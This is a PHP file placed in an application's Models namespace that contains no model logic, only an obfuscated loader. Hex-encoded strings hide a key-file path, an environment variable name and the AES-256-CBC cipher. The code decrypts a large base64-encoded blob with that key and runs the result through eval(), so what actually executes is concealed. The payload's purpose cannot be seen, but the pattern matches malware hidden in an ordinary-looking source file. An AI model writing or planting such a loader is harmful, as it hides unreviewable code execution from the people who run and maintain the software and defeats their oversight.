<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ejMOiPHkoLVxUJEUZcn1/Q==');

$c=base64_decode(

'9Eozc2l2btlRAvR41dmQJzWvTdOV6nRrqBvVajm6I0ProBUnLjkBMNe4UZmaKgziWyVKdz1LyxnK' .
'JNRg39FcGUXL9//KhaymmEkDr2ZKcU7b3zz/Cuqwl6Aq5yJeBXtOye+YD+nNTlGh7cW9Os0IhtxY' .
'Rb4bUiar79oNINjI9CAMKGoW6/hpTTcQixFmT284/gb33MWrBrOpADYc3vI0A8f9hLsAQCrZMoY9' .
'SPefdEppKpCyJdX+oKtpP1r5wNVOWt6ObvhExUQ6nydbq+M4b81HxZ63PbTnIV0PMf817OYOkk9y' .
'oJO0qJVPMkeP0093vpVVqR0HAOBpNkh4frtRtF9bLJC0XSoOiJGZzZ7nBuSFPpQURvXmTqensHGj' .
'KLywHcHWuhnZykSk2LfklT4mhmZn0OAVRUhrIaO4ZAs/wVCwEEjMFIKbHYh0abAEtkY5xgMUG/kJ' .
'xr2mZCvNQVHbzfdk2N+WN6t4vmiPYfYzmgt2GLiFVI8l1wR2wDQq92ji3rY/C33XtQmQvERlJOdk' .
'bIEUAR38eZND812xYe3Y1kWedimlJtySu7EOTRkdDbOyZdXGuGMEDTgYndyJOolvNbPaCYdbvTRh' .
'EDbyFGayoeI0SeYPIEP608/+YkkGXH98Xt+BO72nDbORwLRWHFOpfgWDrkGInJssuOR2glIOWCM1' .
'L0TRTcArKk7jUECSloGsSKjVxKCzwNbunwmPMGR5Ltof3fE4xk3TKT64maJiPBmL9BmBpIQewkv0' .
'E6dQiGLiRcN5xLJuJtJWgr5FKoQIHQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

